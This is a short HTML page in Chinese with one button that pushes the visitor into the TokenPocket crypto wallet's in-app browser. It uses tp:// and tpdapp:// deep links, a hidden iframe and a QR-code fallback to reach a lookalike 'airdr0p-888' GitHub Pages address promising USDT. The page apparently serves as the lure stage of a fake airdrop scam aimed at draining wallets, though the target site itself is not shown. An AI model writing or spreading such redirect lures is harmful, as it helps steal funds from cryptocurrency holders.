<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>打开网页</title>
</head>
<body>

<button onclick="openTPWallet()" style="padding:15px 30px; font-size:18px; background:#007bff; color:white; border:none; border-radius:8px;">
  在 TP 钱包中打开网页
</button>

<div id="qrcode" style="margin-top:20px; display:none; text-align:center;">
  <p>请用 TP 钱包扫码打开：</p>
  <img id="qrcode-img" src="" alt="二维码" style="width:200px;">
</div>

<script>
const TARGET_URL = "https://airdr0p-888.github.io/usdt1688/index.html";

function isTPBrowser() {
  const ua = navigator.userAgent.toLowerCase();
  return ua.indexOf('tokenpocket') !== -1 || ua.indexOf('tpdapp') !== -1;
}

function showQRCode(url) {
  const qr = document.getElementById('qrcode');
  const img = document.getElementById('qrcode-img');
  img.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(url)}`;
  qr.style.display = 'block';
}

function openTPWallet() {
  const encoded = encodeURIComponent(TARGET_URL);
  const tpBrowser = `tp://browser?url=${encoded}`;
  const tpdapp = `tpdapp://open?url=${encoded}`;

  if (isTPBrowser()) {
    location.href = TARGET_URL;
    return;
  }

  location.href = tpBrowser;

  setTimeout(() => {
    try {
      const iframe = document.createElement('iframe');
      iframe.style.display = 'none';
      iframe.src = tpBrowser;
      document.body.appendChild(iframe);
      setTimeout(() => document.body.removeChild(iframe), 2000);
    } catch (e) {}
  }, 300);

  setTimeout(() => {
    location.href = tpdapp;
  }, 2000);

  setTimeout(() => {
    showQRCode(TARGET_URL);
  }, 3500);
}
</script>

</body>
</html>
